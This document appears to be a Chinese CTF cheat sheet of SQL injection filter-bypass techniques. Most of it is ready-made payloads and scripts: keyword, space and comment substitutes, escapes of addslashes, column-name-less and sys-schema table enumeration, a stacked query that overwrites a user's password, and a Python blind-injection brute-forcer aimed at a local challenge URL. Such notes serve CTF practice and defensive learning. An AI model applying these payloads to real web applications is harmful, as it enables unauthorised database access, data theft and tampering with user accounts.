## **关键词绕过**

```
concat
con%0bcat
```


## **大写绕过**
select被过滤，试试Select
```
mysql 8.0.19新增语句table

table table_name

过滤select可以使用table代替
```

^
## **过滤单引号**
```
使用转义\将'转成字符，从而可以拼接。

对于表名，使用16进制编码绕过，如：0x666c6167323361
```


^
## **编码绕过**
is_numeric($_GET['id']) ，过滤只允许数字，16进制编码sql注入。


^
## **过滤数字**
可以用true+true组合，相当于1+1
脚本
```
# 用true代替数字
s='0123456789abcdef-{}'
def convert(strs):
  t='concat('
  for s in strs:
    # t+= 'char(true'+'+true'*(ord(s)-1)+'),'
    t+= 'char(true'+'%2btrue'*(ord(s)-1)+'),'
  return t[:-1]+")"
print(convert('2'))
```


^
## **空格被过滤**
+空格过滤可以利用/**/代替空格。
```
有的时候是union select被过滤，union/**/select也可以绕过
```
编码绕过
```
%09  制表符table

%0a
%0b
%0c
%0d
```


利用括号，括号住变量。
```
所有库
select(group_concat(schema_name))from(information_schema.schemata)
库所有表
select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())
```

反引号代替空格
```
username = 0;update`ctfshow_user`set`pass`=1
```

^
## **注释符被过滤**
```
1、#编码用%23
2、将后面的单引号闭合即可。'or(id=26)and'1'='1   
or '1'='1
```

用;%00 来进行注释
```
http://localhost/CTF/?user=\&pwd=||1;%00
对应SQL语句为：
select user from users where user='\' and pwd='||1;'
等价于：
select user from users where user='xxxxxxxxxxx'||1#
```
盲注
```
import string
import requests
import re
char_set = '0123456789abcdefghijklmnopqrstuvwxyz_'
pw = ''
while 1:
    for ch in char_set:
        url = 'http://localhost/CTF/?user=\\&pwd=||pwd/**/regexp/**/"^%s";%%00'
        r = requests.get(url=url%(pw+ch))
        if 'Welcome Admin' in r.text:
            pw += ch
            print(pw)
            break
    if ch == '_': break
r = requests.get('http://localhost/CTF/?user=&pwd=%s' % pw)
print(re.findall('HRCTF{\S{1,50}}',r.text)[0])
```

^
## **or 被过滤导致orderby、information_schema都不能用**
用其他逻辑运算符and ， && ， &， |  ,1^1^
查表名使用 
```
select group_concat(table_name) from mysql.innodb_table_stats where database_name=database()
```
如果information_schema被禁止，通过sys.schema获取当前数据库表名
```
1&&ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),1,1))=103
2||ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),{},1))={}.format()
```

^
## **无字段名注入**
<https://www.cnblogs.com/hello-there/p/12918265.html>
知道表名，不知道字段名。分析字段数，再统一查某个字段的所有值。
```
表的字段数判断：select 1,2 union select * from user  试出字段数。

再直接查出值，无需知道字段名，查出原表第2的字段的所有记录值
select 1,2 union select * from user;

select `2` from  (select 1,2 union select * from user) as u
select u.2 from (select 1,2 union select * from users) as u

整合
select group_concat(`2`) from  (select 1,2 union select * from user) as u 


1. 列名需要用``包裹起来，字段名为数字，则`2`

2. 使用子查询的时候,即一个查询嵌套在另一个查询中,内层查询的结果可以作为外层查询的条件,内层查询到的结果需要起一个别名(as)
```

## **布尔中知道表名，不知字段名注入，布尔加无列名注入**
已知可以布尔盲注，但不知道字段名，直接无列名注入
```
表中如果有多个记录值：要条件查询成一条，一般都是一条。where flag like "f%"

表的字段数判断：select 1,2 union select * from user  试出字段数。

一个字段一条记录
select((select "{}")>(select * from f1ag_1s_h3r3_hhhhh))
两个字段一条记录，获取字段
select((select 1,"{}")>(select * from f1ag_1s_h3r3_hhhhh))

select((select 1,"fla")>(select * from f1ag_1s_h3r3_hhhhh))
通过flb>flag{xxx} 比较结果1或0即可
当为1时的回显，值-1就是正确字符
2||((select 1,"{}")>(select * from f1ag_1s_h3r3_hhhhh))
```






^
^
## **函数等效替换**
报错函数被过滤，寻找顶替。
ascii和ord


^
## **存在转义函数addslashes绕过**
```
addslashes($id);
将字符串里面的' " \等转义。
'将变成\'


如果此时下面存在，特殊字符去除 \0 %00 \' '
$id=str_replace(array("\\0","%00","\\'","'"),"",$id);

那么传入\0 先变成\\0 再变成\
如果是sql语句\就会转义后面字符。
select * from images where id='{$id}' or path='{$path}'

select * from images where id='\' or path='   {$path}'
这里'\' or path = ' 成了一个单独字符串
$path就可以随意注入
or sleep(3)--+
```

^
如果是数值传参，如果是)闭合，直接不传入"和\即可绕过：
```
addslashes($id);
$res = $conn->query("SELECT `username` FROM ctfshow_users WHERE id = ($id)");

?id=222)%20union%20select%20group_concat(table_name)%20from%20mysql.innodb_table_stats%20where%20database_name%20=%20database()%23
```


^
类似还有\导致'转义逃逸sql注入
```
md5(128, true) //这个true返回二进制的数据结尾就是\，可以转义'。

```

^
## **where后=等于和like被过滤，用字段名使用正则模糊匹配字段的值**
需要知道字段名
```
select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp('^f')

select flag from Flag where flag regexp "^f";

flag like "f%"
(flag)like'c%'
```